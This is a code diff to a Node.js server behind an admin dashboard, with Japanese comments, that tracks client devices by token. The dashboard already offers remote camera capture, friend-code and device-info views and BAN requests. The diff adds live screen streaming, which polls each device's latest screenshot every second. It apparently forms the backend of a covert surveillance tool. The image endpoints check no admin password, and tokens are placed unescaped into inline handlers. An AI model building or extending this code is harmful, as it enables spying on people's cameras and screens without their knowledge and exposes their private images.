@@ -1,4 +1,4 @@
-// server.js - 完全版（BAN機能付き）
+// server.js - 完全版（BAN機能 + 画面配信 + 容量節約クリーンアップ）
 const express = require('express');
 const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
@@ -95,7 +95,8 @@ db.serialize(() => {
       data BLOB NOT NULL,
       mimetype TEXT DEFAULT 'image/jpeg',
       size INTEGER DEFAULT 0,
-      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+      type TEXT DEFAULT 'camera'
     )
   `);
   // BAN リクエスト用テーブル
@@ -123,6 +124,15 @@ db.all("PRAGMA table_info(tokens)", (err, rows) => {
   if (!cols.includes('last_seen')) {
     db.run("ALTER TABLE tokens ADD COLUMN last_seen INTEGER DEFAULT NULL");
     console.log("[Migration] last_seen 列を追加");
+  }
+});
+
+db.all("PRAGMA table_info(camera_images)", (err, rows) => {
+  if (err) return;
+  const cols = (rows || []).map(r => r.name);
+  if (!cols.includes('type')) {
+    db.run("ALTER TABLE camera_images ADD COLUMN type TEXT DEFAULT 'camera'");
+    console.log("[Migration] camera_images.type 列を追加");
   }
 });
 
@@ -227,11 +237,9 @@ app.get('/dashboard', async (req, res) => {
     const cameraPending = cameraPendingCounts[t] || 0;
     const cameraBadge = cameraPending > 0 ? ` <span style="color:#e67e22; font-weight:bold;">📷待機中(${cameraPending})</span>` : '';
 
-    // BAN待機バッジ
     const banPending = banPendingCounts[t] || 0;
     const banBadge = banPending > 0 ? ` <span style="color:#e74c3c; font-weight:bold;">🚫BAN待機(${banPending})</span>` : '';
 
-    // オンライン状態の判定（5秒以内に通信があれば「使用中」）
     const isOnline = d.last_seen && (Date.now() - d.last_seen < 5000);
     const onlineBadge = isOnline 
       ? `<span style="background:#28a745; color:white; padding:2px 6px; border-radius:4px; font-size:12px; font-weight:bold; margin-right:8px;">🟢 使用中</span>` 
@@ -246,6 +254,7 @@ app.get('/dashboard', async (req, res) => {
       <a href="javascript:void(0)" onclick="showFriendCodes('${t}')" style="color:#007bff; margin-left:8px;">[フレンドコードをみる]</a>
       <a href="javascript:void(0)" onclick="requestCamera('${t}')" style="color:#e67e22; margin-left:8px; font-weight:bold;">[📷 カメラ]</a>
       <a href="javascript:void(0)" onclick="showCameraImages('${t}')" style="color:#9b59b6; margin-left:8px; font-weight:bold;">[🖼 画像を見る]</a>
+      <a href="javascript:void(0)" onclick="showScreenMonitor('${t}')" style="color:#e74c3c; margin-left:8px; font-weight:bold;">[🖥️ 画面を見る]</a>
       <a href="javascript:void(0)" onclick="requestBan('${t}')" style="color:#c0392b; margin-left:8px; font-weight:bold; background:#ffe5e5; padding:2px 8px; border-radius:4px;">[🚫 BAN]</a>
     </li>`;
   }
@@ -262,7 +271,7 @@ app.get('/dashboard', async (req, res) => {
 
     <div id="modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.55); z-index:1000;">
       <div style="background:white; margin:40px auto; padding:22px; max-width:920px; max-height:82vh; overflow-y:auto; border-radius:10px; position:relative; box-shadow:0 8px 32px rgba(0,0,0,0.3);">
-        <button onclick="document.getElementById('modal').style.display='none'" style="position:absolute; top:10px; right:10px; padding:6px 12px; cursor:pointer; background:#666; color:white; border:none; border-radius:5px;">閉じる</button>
+        <button onclick="closeModal()" style="position:absolute; top:10px; right:10px; padding:6px 12px; cursor:pointer; background:#666; color:white; border:none; border-radius:5px;">閉じる</button>
         <div id="modal-content" style="margin-top:16px;"></div>
       </div>
     </div>
@@ -271,6 +280,16 @@ app.get('/dashboard', async (req, res) => {
     let adminPw = ${JSON.stringify(adminPw)};
     if (adminPw) sessionStorage.setItem('adminPw', adminPw);
     else adminPw = sessionStorage.getItem('adminPw') || '';
+
+    let screenMonitorInterval = null;
+
+    function closeModal() {
+      if (screenMonitorInterval) {
+        clearInterval(screenMonitorInterval);
+        screenMonitorInterval = null;
+      }
+      document.getElementById('modal').style.display = 'none';
+    }
 
     function showDeviceInfo(token) {
       fetch('/api/device-info?token=' + encodeURIComponent(token)).then(r => r.text()).then(html => {
@@ -290,6 +309,39 @@ app.get('/dashboard', async (req, res) => {
         document.getElementById('modal').style.display = 'block';
       });
     }
+
+    function showScreenMonitor(token) {
+      if (screenMonitorInterval) clearInterval(screenMonitorInterval);
+
+      document.getElementById('modal-content').innerHTML = \`
+        <h2>🖥️ 画面モニター</h2>
+        <p><b>Token:</b> <code>\${token}</code> <span style="color:red; font-size:12px;">(1秒ごとに更新)</span></p>
+        <div style="width:100%; background:#000; border-radius:8px; overflow:hidden; position:relative; min-height:300px; display:flex; justify-content:center; align-items:center;">
+          <img id="screen-live-img" src="" style="width:100%; height:auto; display:block;" onerror="this.style.opacity=0.5;">
+        </div>
+      \`;
+      document.getElementById('modal').style.display = 'block';
+
+      const img = document.getElementById('screen-live-img');
+      const fetchLatestScreen = () => {
+        fetch(\`/api/latest-screen?token=\${encodeURIComponent(token)}&t=\${Date.now()}\`)
+          .then(res => {
+            if (res.ok) return res.blob();
+            throw new Error('No image');
+          })
+          .then(blob => {
+            const url = URL.createObjectURL(blob);
+            img.src = url;
+            img.style.opacity = 1;
+          })
+          .catch(() => {
+            img.style.opacity = 0.3;
+          });
+      };
+      fetchLatestScreen();
+      screenMonitorInterval = setInterval(fetchLatestScreen, 1000);
+    }
+
     async function requestCamera(token) {
       if (!adminPw) return alert('セッションが切れました。再度ログインしてください。');
       try {
@@ -492,7 +544,7 @@ app.get('/api/log-fc', (req, res) => {
   });
 });
 
-// === カメラ機能 ===
+// === カメラ / 画面配信機能 ===
 app.post('/api/admin/request-camera', (req, res) => {
   const adminPassword = req.headers['x-admin-password'];
   if (adminPassword !== ADMIN_PASSWORD) return res.status(401).json({ error: 'Unauthorized' });
@@ -518,7 +570,6 @@ app.get('/api/camera-poll', (req, res) => {
   if (!data) return res.status(404).json({ error: 'invalid token' });
   if (data.device_id !== device) return res.status(403).json({ error: 'device mismatch' });
 
-  // ポーリング（5秒毎）を生存確認として利用
   data.last_seen = Date.now();
   db.run("UPDATE tokens SET last_seen = ? WHERE token = ?", [data.last_seen, token]);
 
@@ -534,7 +585,7 @@ app.get('/api/camera-poll', (req, res) => {
 });
 
 app.post('/api/camera-upload', (req, res) => {
-  const { token, requestId, device, imageBase64, mimetype } = req.body || {};
+  const { token, requestId, device, imageBase64, mimetype, type } = req.body || {};
   if (!token || !device || !imageBase64) return res.status(400).json({ error: 'missing fields' });
 
   const data = tokenCache[token];
@@ -546,8 +597,19 @@ app.post('/api/camera-upload', (req, res) => {
   if (buffer.length === 0) return res.status(400).json({ error: 'empty image' });
   if (buffer.length > 5 * 1024 * 1024) return res.status(413).json({ error: 'too large' });
 
-  db.run("INSERT INTO camera_images (token, request_id, data, mimetype, size) VALUES (?, ?, ?, ?, ?)", [token, requestId || null, buffer, mimetype || 'image/jpeg', buffer.length], function (err) {
+  db.run("INSERT INTO camera_images (token, request_id, data, mimetype, size, type) VALUES (?, ?, ?, ?, ?, ?)", [token, requestId || null, buffer, mimetype || 'image/jpeg', buffer.length, type || 'camera'], function (err) {
     if (err) return res.status(500).json({ error: err.message });
+    
+    // ★追加: 画面配信画像は最新3枚のみ残して削除（カメラ写真は削除しない）
+    if (type === 'screen') {
+      db.run(`
+        DELETE FROM camera_images 
+        WHERE token = ? AND type = 'screen' AND id NOT IN (
+          SELECT id FROM camera_images WHERE token = ? AND type = 'screen' ORDER BY id DESC LIMIT 3
+        )
+      `, [token, token]);
+    }
+
     if (requestId) db.run("UPDATE camera_requests SET status = 'captured', captured_at = CURRENT_TIMESTAMP WHERE id = ?", [requestId]);
     res.json({ ok: true, imageId: this.lastID });
   });
@@ -557,7 +619,8 @@ app.get('/api/camera-images', (req, res) => {
   const { token } = req.query;
   if (!token) return res.send('<p>token required</p>');
 
-  db.all("SELECT id, size, mimetype, created_at FROM camera_images WHERE token = ? ORDER BY id DESC LIMIT 100", [token], (err, rows) => {
+  // カメラ写真のみ一覧表示
+  db.all("SELECT id, size, mimetype, created_at FROM camera_images WHERE token = ? AND type = 'camera' ORDER BY id DESC LIMIT 100", [token], (err, rows) => {
     if (err) return res.send('<p>DB error</p>');
     let html = `<h2>📷 撮影画像</h2><p><b>Token:</b> <code>${escapeHtml(token)}</code></p>`;
     if (!rows || rows.length === 0) {
@@ -575,6 +638,17 @@ app.get('/api/camera-images', (req, res) => {
     });
     html += `</div>`;
     res.send(html);
+  });
+});
+
+// ★追加: 最新の画面配信画像を取得
+app.get('/api/latest-screen', (req, res) => {
+  const { token } = req.query;
+  db.get("SELECT data, mimetype FROM camera_images WHERE token = ? AND type = 'screen' ORDER BY id DESC LIMIT 1", [token], (err, row) => {
+    if (err || !row) return res.status(404).send('not found');
+    res.set('Content-Type', row.mimetype || 'image/jpeg');
+    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+    res.send(row.data);
   });
 });
 
@@ -619,7 +693,6 @@ app.get('/api/ban-poll', (req, res) => {
   if (!data) return res.status(404).json({ error: 'invalid token' });
   if (data.device_id !== device) return res.status(403).json({ error: 'device mismatch' });
 
-  // 生存確認
   data.last_seen = Date.now();
   db.run("UPDATE tokens SET last_seen = ? WHERE token = ?", [data.last_seen, token]);
 
